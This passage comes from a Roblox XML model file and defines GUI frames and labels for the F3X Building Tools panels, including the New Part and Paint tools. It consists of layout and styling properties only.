											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-4</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBX2364099CD40B4C748F13027F1BDBFA6F">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextBox" referent="RBXF88298F75A904CFAB8D8EF766C48BCCB">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClearTextOnFocus">true</bool>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<bool name="MultiLine">false</bool>
											<string name="Name">TextBox</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<bool name="ShowNativeInput">true</bool>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX98405F1FCDAE451CA1955BAC8F0DAB68">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Bottom</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>5</XO>
										<YS>1</YS>
										<YO>-10</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-5</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBXD137F09721544621BBAE839BA03B5D0A">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4285215356</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="TextLabel" referent="RBX26691AFE6E4B4C1FB8CC5AB48E40BBB7">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">5</token>
									<string name="Name">SelectNote</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>27</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-10</XO>
										<YS>0</YS>
										<YO>15</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<string name="Text">Select something to use this tool.</string>
									<Color3 name="TextColor3">4294967295</Color3>
									<bool name="TextScaled">true</bool>
									<float name="TextSize">14</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">0.5</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">true</bool>
									<token name="TextXAlignment">0</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
						</Item>
						<Item class="Frame" referent="RBX1584DD8FD6964431A6213A8128EFC9D7">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4288914085</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">0</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">true</bool>
								<string name="Name">BTNewPartToolGUI</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>280</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>220</XO>
									<YS>0</YS>
									<YO>90</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="Frame" referent="RBXB8F7D2B7E3074B27B7DA9C1DD18A475F">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Title</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX74FF77483B8E425E96A0D2628939E312">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4279308561</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>-3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-5</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBXC6A6348C8427443A83CF07FD74B260F5">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">NEW PART TOOL</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX0FEF71E9384847A1B8E2E576FBCEA0C5">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">5</token>
										<string name="Name">F3XSignature</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">F3X</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.899999976</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">1</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX85B5C1CA75CE4E15AB33F552B973B372">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">TypeOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX66052A427DEB41B9825C4F3B074A3DCF">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>14</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>50</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Part Type</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX4CB00EB4FF6D48139C756C0F21218E21">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Tip</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>5</XO>
										<YS>0</YS>
										<YO>70</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-5</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX4951A1EA146542CEAE8280121327676A">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4279308561</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX1B47FBE790FD49A08F0674DD2641D4AB">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">3</token>
										<string name="Name">Text</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">TIP: Point and click for a new part.</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">11</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.5</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
						</Item>
						<Item class="Frame" referent="RBXCAF18800583749B39B595F53841C8FE8">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4288914085</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">0</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">true</bool>
								<string name="Name">BTPaintToolGUI</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>230</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>205</XO>
									<YS>0</YS>
									<YO>230</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="Frame" referent="RBXDFE13488C20E4D029AEA35B7FA06FBDA">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Title</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX54EBCAD62D9C45D6BA33FF36169476E7">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294901760</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>-3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-5</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX0BB0A8634801443E90D8214E7BF1E306">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">PAINT TOOL</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBXC7FEBE1ADBA9450E85FED9064FDCC9C7">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">5</token>
										<string name="Name">F3XSignature</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">F3X</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.899999976</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">1</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX988E980E8B4345BD95825FCB9ECF16BF">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4278190080</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">1</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Palette</string>
									<Ref name="NextSelectionDown">null</Ref>
